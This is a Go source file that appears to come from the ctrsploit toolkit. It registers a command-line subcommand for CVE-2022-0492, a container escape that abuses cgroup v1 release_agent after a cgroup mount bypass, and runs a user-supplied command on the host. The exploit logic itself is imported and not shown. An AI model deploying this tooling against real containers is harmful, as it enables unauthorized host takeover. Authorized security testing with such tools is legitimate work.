package exploit

import (
	"fmt"
	cgroup_mount_bypass_cgroupv1_release_agent "github.com/ctrsploit/ctrsploit/exploit/cgroup_mount-bypass-cgroupv1-release_agent"
	"github.com/ctrsploit/sploit-spec/pkg/log"
	"github.com/ssst0n3/awesome_libs/awesome_error"
	"github.com/urfave/cli/v2"
)

var cgroupMountBypassCgroupV1ReleaseAgentCommand = &cli.Command{
	Name:    cgroup_mount_bypass_cgroupv1_release_agent.ExpName,
	Aliases: []string{"ra2", "cve-2022-0492", "0492", "cgroup_mount_bypass"},
	Usage:   "cve-2022-0492: escape tech by using the notify_on_release of cgroup v1 after cgroup_mount bypass",
	Flags: []cli.Flag{
		&cli.StringFlag{Name: "cmd", Aliases: []string{"c"}, Required: true},
		&cli.BoolFlag{Name: "unknown_rootfs", Aliases: []string{"u"}, Required: false},
	},
	Action: func(context *cli.Context) error {
		cmd := context.String("cmd")
		log.Logger.Info(fmt.Sprintf("Execute command: %s", cmd))
		debug := context.Bool("debug")
		unknownRootfs := context.Bool("unknown_rootfs")
		err := cgroup_mount_bypass_cgroupv1_release_agent.InvokeExploit(cmd, debug, unknownRootfs)
		awesome_error.CheckFatal(err)
		//output, err := os.ReadAll(out)
		//awesome_error.CheckErr(err)
		//log.Logger.Info("\n", string(output))
		return nil
	},
}
